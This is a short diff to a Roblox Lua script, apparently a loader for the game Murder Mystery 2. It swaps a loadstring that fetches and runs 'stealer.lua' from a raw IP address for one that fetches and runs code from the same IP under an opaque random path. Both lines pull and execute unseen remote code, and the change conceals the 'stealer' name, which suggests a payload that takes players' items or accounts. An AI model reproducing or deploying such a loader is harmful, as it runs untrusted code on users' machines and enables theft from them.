@@ -1,3 +1,1 @@
-ID="y80juZvcBmHN61r5q4UItLYOlOZXt67L9c1jzhyt"
-SERVER_URL="http://31.172.87.116/"
-loadstring(game:HttpGet(SERVER_URL .. "murder-mystery-2/stealer.lua"))()
+loadstring(game:HttpGet("http://31.172.87.116/HL0TvdENXVSyp67KwFhlNgSt22yoWrCWrMpJ79Co32eBp131Fr20WPYyLosMykkCCbOFDcrvt6aOfyhg"))()
